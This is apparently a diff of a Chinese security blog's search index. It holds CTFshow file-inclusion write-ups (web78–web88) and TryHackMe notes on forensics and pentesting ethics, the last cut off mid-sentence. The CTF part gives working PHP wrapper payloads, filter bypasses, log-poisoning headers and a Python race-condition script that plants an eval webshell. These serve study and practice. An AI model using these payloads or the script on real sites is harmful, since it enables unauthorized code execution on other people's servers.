+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%37%33%25%36%38%25%36%35%25%36%63%25%36%63%25%32%65%25%37%30%25%36%38%25%37%30</span><br></pre></td></tr></table></figure>
+<p><strong>post参数</strong></p>
+<p>p神的文章里详细的写了有关死亡exit的绕过方式</p>
+<p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">谈一谈php://filter的妙用 | 离别歌 (leavesongs.com)</a></p>
+<p>这边使用的是直接命令执行，当然也可以选择使用一句话木马</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php system(&#x27;ls&#x27;);</span><br><span class="line">base64 编码：</span><br><span class="line">PD9waHAgc3lzdGVtKCdscycpOw==</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php system(&#x27;cat fl0g.php&#x27;);</span><br><span class="line">base64 编码：</span><br><span class="line">PD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTs=</span><br></pre></td></tr></table></figure>
+<p>最终传入的需要添加两个字符在最前面，因为base64的解码规则是4byte一组，而phpdie仅有六个字母</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">content=aaPD9waHAgc3lzdGVtKCdscycpOw==</span><br><span class="line">content=aaPD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTs=</span><br></pre></td></tr></table></figure>
+<h2 id="web88">web88</h2>
+<h3 id="源码-6">源码</h3>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;</span>, <span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="payload-6">payload</h3>
+<p>利用data协议的base编码来进行绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php system(&#x27;tac f*.php&#x27;);?&gt; </span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZioucGhwJyk7Pz4g</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>CTFshow</category>
+      </categories>
+      <tags>
+        <tag>文件包含</tag>
       </tags>
   </entry>
   <entry>
@@ -1970,96 +2060,6 @@ FFI是PHP中调用C代码的手段
       </tags>
   </entry>
   <entry>
-    <title>CTFshow-文件包含</title>
-    <url>/2024/01/19/CTFshow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
-    <content><![CDATA[<h1>CTFshow-文件包含</h1>
-<h2 id="web78">web78</h2>
-<h3 id="源码">源码</h3>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="payload">payload</h3>
-<p>文件包含，伪协议的利用，可以使用的方法有很多</p>
-<h4 id="方法一">方法一</h4>
-<p>php协议</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
-<h4 id="方法二">方法二</h4>
-<p>data协议+命令执行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=data://text/plain,&lt;?php system(&#x27;ls&#x27;);?&gt; </span><br><span class="line">?file=data://text/plain,&lt;?php system(&#x27;tac flag.php&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
-<h2 id="web79">web79</h2>
-<h3 id="源码-2">源码</h3>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="payload-2">payload</h3>
-<p>过滤了php，可以考虑的办法就是对php绕过或者是改用其他协议</p>
-<p>这边选择直接使用data协议+命令执行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=data://text/plain,&lt;?=system(&quot;tac%20flag.php&quot;);?&gt;</span><br></pre></td></tr></table></figure>
-<p>注意跟上题不同的一点，因为过滤了php，所以在php代码执行环境的方法需要变一下</p>
-<h2 id="web80">web80</h2>
-<h3 id="源码-3">源码</h3>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="payload-3">payload</h3>
-<p>这里将data协议也过滤了</p>
-<p>这里学到一个新方法，利用文件日志包含进行getshell的操作</p>
-<p>首先在User-Agent中写入我们需要执行的命令，然后相关请求就会存放于日志文件中，然后对该日志文件进行文件包含操作，就可以成功getshell了，当然直接写入一句话木马也是可以的。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-Agent:&lt;?php system(&#x27;ls&#x27;);?&gt;</span><br><span class="line">User-Agent:&lt;?php system(&#x27;cat fl0g.php&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
-<h2 id="web81">web81</h2>
-<h3 id="源码-4">源码</h3>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="payload-4">payload</h3>
-<p>本题仅禁用了:，对于上一题的日志写入没有过滤，仍然可以使用</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-Agent:&lt;?php system(&#x27;ls&#x27;);?&gt;</span><br><span class="line">User-Agent:&lt;?php system(&#x27;cat fl0g.php&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
-<h2 id="web82">web82</h2>
-<h2 id="web83">web83</h2>
-<h2 id="web84">web84</h2>
-<h2 id="web85">web85</h2>
-<h2 id="web86">web86</h2>
-<p>以上这些全部归属于条件竞争</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="comment"># 填入对应网址</span></span><br><span class="line">url=<span class="string">&#x27;h&#x27;</span></span><br><span class="line">sessionid=<span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line">data=&#123;</span><br><span class="line">	<span class="string">&quot;1&quot;</span>:<span class="string">&quot;file_put_contents(&#x27;/var/www/html/muma.php&#x27;,&#x27;&lt;?php eval($_POST[a]);?&gt;&#x27;);&quot;</span></span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">post 传递内容可在网站目录下写入一句话木马。</span></span><br><span class="line"><span class="string">根据资料，内容暂存在 /tmp/ 目录下 sess_sessionid 文件。</span></span><br><span class="line"><span class="string">sessionid 可控，所以这里即 /tmp/sess_ctfshow。</span></span><br><span class="line"><span class="string">这样一旦访问成功，就说明木马植入了</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># /tmp/sess_sessionid 中写入一句话木马。</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):  </span><br><span class="line">	fileBytes = io.BytesIO(<span class="string">b&#x27;a&#x27;</span>*<span class="number">1024</span>*<span class="number">50</span>)</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		response=session.post(</span><br><span class="line">			url,</span><br><span class="line">			data=&#123;</span><br><span class="line">			<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span></span><br><span class="line">			&#125;,</span><br><span class="line">			cookies=&#123;</span><br><span class="line">			<span class="string">&#x27;PHPSESSID&#x27;</span>:sessionid</span><br><span class="line">			&#125;,</span><br><span class="line">			files=&#123;</span><br><span class="line">			<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;ctfshow.jpg&#x27;</span>,fileBytes)</span><br><span class="line">			&#125;</span><br><span class="line">			)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 访问 /tmp/sess_sessionid，post 传递信息，保存新木马。</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		response=session.post(</span><br><span class="line">			url+<span class="string">&#x27;?file=/tmp/sess_&#x27;</span>+sessionid,</span><br><span class="line">	        data=data,</span><br><span class="line">			cookies=&#123;</span><br><span class="line">			<span class="string">&#x27;PHPSESSID&#x27;</span>:sessionid</span><br><span class="line">			&#125;</span><br><span class="line">			)</span><br><span class="line">		<span class="comment"># 访问木马文件，如果访问到了就代表竞争成功</span></span><br><span class="line">		resposne2=session.get(url+<span class="string">&#x27;muma.php&#x27;</span>)</span><br><span class="line">		<span class="keyword">if</span> resposne2.status_code==<span class="number">200</span>:</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&#x27;++++++done++++++&#x27;</span>)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="built_in">print</span>(resposne2.status_code)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">	evnet=threading.Event()</span><br><span class="line">	<span class="comment"># 写入和访问分别设置 5 个线程。</span></span><br><span class="line">	<span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">			threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">			threading.Thread(target=read,args=(session,)).start()</span><br><span class="line"></span><br><span class="line">	evnet.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure>
-<p>这是一个现有的exp，具体原理需要研究一下</p>
-<h2 id="web87">web87</h2>
-<h3 id="源码-5">源码</h3>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$file</span>), <span class="string">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="payload-5">payload</h3>
-<p>这边先来看一下<code>file_put_contents</code> 是一个 PHP 函数，用于将一个字符串写入文件。它提供了一种简单的方法，可以直接将字符串内容写入文件中，而无需使用多个函数来打开、写入和关闭文件。</p>
-<p>基本的语法如下：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_put_contents</span>(filename, data, mode, context);</span><br></pre></td></tr></table></figure>
-<p>其中：</p>
-<ul>
-<li><code>filename</code> 是要写入的目标文件的文件名，可以包含路径信息。</li>
-<li><code>data</code> 是要写入文件的字符串数据。</li>
-<li><code>mode</code> 是一个可选参数，表示文件写入的模式。默认是 <code>0</code>，表示没有特殊处理。你可以使用 <code>FILE_APPEND</code> 来在文件末尾追加内容，如果文件不存在，则会创建新文件。</li>
-<li><code>context</code> 是一个可选参数，表示上下文资源，通常在需要自定义流上下文的情况下使用。</li>
-</ul>
-<p><strong>get参数</strong></p>
-<p>get请求的参数file会经过urldecode参数的处理，所以在传入的时候需要经过二次编码</p>
-<p><strong>原始</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=php://filter/write=convert.base64-decode/resource=shell.php</span><br></pre></td></tr></table></figure>
-<p><strong>二次编码</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%37%33%25%36%38%25%36%35%25%36%63%25%36%63%25%32%65%25%37%30%25%36%38%25%37%30</span><br></pre></td></tr></table></figure>
-<p><strong>post参数</strong></p>
-<p>p神的文章里详细的写了有关死亡exit的绕过方式</p>
-<p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">谈一谈php://filter的妙用 | 离别歌 (leavesongs.com)</a></p>
-<p>这边使用的是直接命令执行，当然也可以选择使用一句话木马</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php system(&#x27;ls&#x27;);</span><br><span class="line">base64 编码：</span><br><span class="line">PD9waHAgc3lzdGVtKCdscycpOw==</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php system(&#x27;cat fl0g.php&#x27;);</span><br><span class="line">base64 编码：</span><br><span class="line">PD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTs=</span><br></pre></td></tr></table></figure>
-<p>最终传入的需要添加两个字符在最前面，因为base64的解码规则是4byte一组，而phpdie仅有六个字母</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">content=aaPD9waHAgc3lzdGVtKCdscycpOw==</span><br><span class="line">content=aaPD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTs=</span><br></pre></td></tr></table></figure>
-<h2 id="web88">web88</h2>
-<h3 id="源码-6">源码</h3>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;</span>, <span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="payload-6">payload</h3>
-<p>利用data协议的base编码来进行绕过</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php system(&#x27;tac f*.php&#x27;);?&gt; </span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZioucGhwJyk7Pz4g</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>CTFshow</category>
-      </categories>
-      <tags>
-        <tag>文件包含</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>NSSCTF Round-17 Basic-Writeup-Web</title>
     <url>/2024/02/21/NSSCTF%20Round-17%20Basic-Writeup-Web/</url>
     <content><![CDATA[<h1>NSSCTF Round-17 Basic-Writeup-Web</h1>
@@ -2107,7 +2107,7 @@ FFI是PHP中调用C代码的手段
   </entry>
   <entry>
     <title>Tryhackme_Diary-1</title>
-    <url>/2024/02/22/Tryhackme_Diary-1/</url>
+    <url>/2024/02/21/Tryhackme_Diary-1/</url>
     <content><![CDATA[<h1>Tryhackme_Diary-1</h1>
 <h2 id="前言">前言</h2>
 <p>开始在Tryhackme学习，随手记录一下，顺带进行了中文版的翻译</p>
@@ -2185,6 +2185,105 @@ FFI是PHP中调用C代码的手段
 <h4 id="Practical-Example-of-Digital-Forensics">Practical Example of Digital Forensics</h4>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">我们在数字设备上所做的一切，从智能手机到计算机，都会留下痕迹。让我们看看如何在后续的调查中利用这一点。</span><br><span class="line"></span><br><span class="line">我们的猫，Gado，被绑架了。绑匪给我们发送了一份请求的文档，格式为MS Word文档。我们已经将文档转换为PDF格式，并从MS Word文件中提取了图像以方便您查看。</span><br><span class="line"></span><br><span class="line">您可以下载附件到本地计算机进行检查；但是，为了您的方便，我们已将文件添加到AttackBox中。要跟随操作，请在AttackBox上打开终端，然后转到如下所示的目录。在以下终端输出中，我们更改了包含案例文件的目录。/root/Rooms/introdigitalforensics</span><br><span class="line"></span><br><span class="line">终端</span><br><span class="line">root# cd /root/Rooms</span><br><span class="line">root# cd introdigitalforensics</span><br><span class="line">root# ls</span><br><span class="line">letter-image.jpg  ransom-letter.doc  ransom-letter.pdf  ransom-lettter-2.zip</span><br><span class="line">文档元数据</span><br><span class="line">当您创建一个文本文件时，操作系统会保存一些元数据，例如文件创建日期和上次修改日期。但是，如果您使用更高级的编辑器，例如MS Word，则文件的元数据会保留许多信息。有各种方法可以读取文件元数据；您可以在官方的查看器/编辑器中打开它们，也可以使用适当的取证工具。请注意，将文件导出到其他格式（例如）将保留原始文档的大多数元数据，具体取决于所使用的PDF编写程序。TXTPDF</span><br><span class="line"></span><br><span class="line">让我们看看我们可以从PDF文件中了解到什么。我们可以尝试使用程序读取元数据。Pdfinfo显示与PDF文件相关的各种元数据，例如标题、主题、作者、创建者和创建日期。（AttackBox已经安装了；但是，如果您使用的是Kali Linux并且没有安装，请使用安装。）考虑以下使用的示例。.pdfinfopdfinfopdfinfosudo apt install poppler-utilspdfinfo DOCUMENT.pdf</span><br><span class="line"></span><br><span class="line">终端</span><br><span class="line">user@TryHackMe$ pdfinfo DOCUMENT.pdf </span><br><span class="line">创建者:        Microsoft® Word for Office 365</span><br><span class="line">生产者:       Microsoft® Word for Office 365</span><br><span class="line">创建日期:   Wed Oct 10 21:47:53 2018 EEST</span><br><span class="line">修改日期:        Wed Oct 10 21:47:53 2018 EEST</span><br><span class="line">标记:         yes</span><br><span class="line">用户属性: no</span><br><span class="line">嫌疑人:       no</span><br><span class="line">表单:           none</span><br><span class="line">JavaScript:     no</span><br><span class="line">页数:          20</span><br><span class="line">加密:      no</span><br><span class="line">页面大小:      595.32 x 841.92 pts (A4)</span><br><span class="line">页面旋转:       0</span><br><span class="line">文件大小:      560362 字节</span><br><span class="line">优化:      no</span><br><span class="line">PDF版本:    1.7</span><br><span class="line">PDF元数据清楚地显示了它是使用MS Word for Office 365于2018年10月10日创建的。</span><br><span class="line"></span><br><span class="line">照片EXIF数据</span><br><span class="line">EXIF代表可交换图像文件格式；这是一种将元数据保存到图像文件中的标准。每当您使用智能手机或数码相机拍照时，都会嵌入大量信息到图像中。以下是原始数字图像中可能包含的元数据示例：</span><br><span class="line"></span><br><span class="line">相机型号/智能手机型号</span><br><span class="line">图像捕获的日期和时间</span><br><span class="line">照片设置，例如焦距、光圈、快门速度和ISO设置</span><br><span class="line">由于智能手机配备有GPS传感器，因此在图像中找到嵌入的GPS坐标的可能性很高。 GPS坐标，即纬度和经度，通常会显示拍摄照片的地点。</span><br><span class="line"></span><br><span class="line">有许多在线和离线工具可用于读取图像的EXIF数据。其中一个命令行工具是。 ExifTool用于读取和写入各种文件类型的元数据，例如JPEG图像。（AttackBox已经安装了；但是，如果您使用的是Kali Linux并且没有安装，请</span><br><span class="line"></span><br><span class="line">使用安装。）在以下终端窗口中，我们执行了以读取此图像中嵌入的所有EXIF数据。exiftoolexiftoolexiftoolsudo apt install libimage-exiftool-perlexiftool IMAGE.jpg</span><br><span class="line"></span><br><span class="line">终端</span><br><span class="line">user@TryHackMe$ exiftool IMAGE.jpg</span><br><span class="line">[...]</span><br><span class="line">GPS位置: 51度31&#x27;4.00&quot; N，0度5&#x27;48.30&quot; W</span><br><span class="line">[...]</span><br><span class="line">如果您将上述坐标搜索到在线地图上，您将了解有关此位置的更多信息。在Microsoft Bing Maps或Google Maps中搜索，会发现这些坐标表明该图像是在伦敦博物馆附近拍摄的。 （我们只替换了以使我们的搜索起作用。）我们注意到坐标在搜索页面上被转换为十进制表示：.51° 31&#x27; 4.00&quot; N，0° 5&#x27; 48.30&quot; Wdeg°51.517776, -0.09675</span><br><span class="line"></span><br><span class="line">使用或任何类似的工具，尝试找出绑匪拍摄其附加到文档中的图像的地点。街道的名称是什么？exiftool</span><br></pre></td></tr></table></figure>
 <p>这边给了例题，主要就是查找基本的exif信息，除了上述给出的工具，直接用010手撸都行，最简单的misc</p>
+]]></content>
+      <categories>
+        <category>Tryhackme</category>
+      </categories>
+      <tags>
+        <tag>Tryhackme</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Tryhackme_Diary-3</title>
+    <url>/2024/02/24/Tryhackme_Diary-3/</url>
+    <content><![CDATA[<h1>Tryhackme_Diary-3</h1>
+<h2 id="Introduction-to-Pentesting">Introduction to Pentesting</h2>
+<h3 id="What-is-Penetration-Testing">What is Penetration Testing?</h3>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在教授您道德黑客的技术操作方面之前，您需要更多了解渗透测试人员的工作职责以及执行渗透测试（发现客户应用程序或系统中的漏洞）的过程。</span><br><span class="line">网络安全的重要性和相关性不断增加，并且可以在生活的各个方面体现。新闻标题充斥着我们的屏幕，报道又一次的黑客攻击或数据泄漏事件。</span><br><span class="line"></span><br><span class="line">网络安全对现代世界的所有人都是相关的，包括建立强密码政策以保护您的电子邮件，或是对企业和其他组织来说，需要保护设备和数据免受损害。</span><br><span class="line"></span><br><span class="line">渗透测试或pentest是一种在道德框架下进行的尝试，旨在测试和分析保护这些资产和信息的安全防御措施。渗透测试涉及使用与具有恶意意图的人相同的工具、技术和方法，并类似于审计。</span><br><span class="line"></span><br><span class="line">据《Security Magazine》（一家网络安全行业杂志）称，每天有超过2200次网络攻击- 每39秒发生一次攻击。</span><br></pre></td></tr></table></figure>
+<h3 id="Penetration-Testing-Ethics">Penetration Testing Ethics</h3>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在网络安全领域，尤其是渗透测试中，合法性和道德常常备受争议。标签如“黑客”和“骇客”在流行文化中往往带有负面含义，这要归功于一小部分不法分子。合法地获取对计算机系统的访问权是一个难以理解的概念 —— 毕竟，到底什么才算是合法的呢？</span><br><span class="line"></span><br><span class="line">回想一下，渗透测试是系统所有者同意的对计算机系统安全和防御的授权审计。在这个意义上，渗透测试的合法性是十分明确的；任何超出此协议范围的行为都被视为未经授权。</span><br><span class="line"></span><br><span class="line">在渗透测试开始之前，渗透测试人员与系统所有者进行正式讨论。他们就要测试的各种工具、技术和系统达成一致。这些讨论形成了渗透测试协议的范围，并将决定渗透测试的进行方式。</span><br><span class="line"></span><br><span class="line">提供渗透测试服务的公司受到法律框架和行业认证的约束。例如，在英国，国家网络安全中心（NCSC）设有CHECK认证计划。这个认证意味着只有“[CHECK]认可的公司才能对公共部门和关键基础设施的系统和网络进行授权的渗透测试。”（NCSC）</span><br><span class="line"></span><br><span class="line">道德是关于对错的道德辩论；在一个行为可能是合法的情况下，它可能会违背个人的道德信仰系统，即对错之间的选择。</span><br><span class="line"></span><br><span class="line">在渗透测试期间，渗透测试人员经常面临潜在的道德问题。例如，他们可能获得了对数据库的访问权，并面临可能敏感数据的获取。或者，他们可能正在对一个员工进行网络钓鱼攻击，以测试组织的人为安全性。如果这个行为在初始阶段得到了同意，那么它是合法的 —— 然而在道德上具有疑问。</span><br><span class="line"></span><br><span class="line">黑客被分为三类，他们的道德和行为动机决定了他们所处的黑客类型。让我们在下表中介绍这三类：</span><br><span class="line"></span><br><span class="line">黑客类型	描述	示例</span><br><span class="line">白帽黑客	这些黑客被认为是“好人”。他们遵守法律，利用自己的技能造福他人。	例如，一名在公司进行授权测试的渗透测试人员。</span><br><span class="line">灰帽黑客	这些人利用自己的技能来造福他人，然而，他们并不始终遵守法律或道德标准。	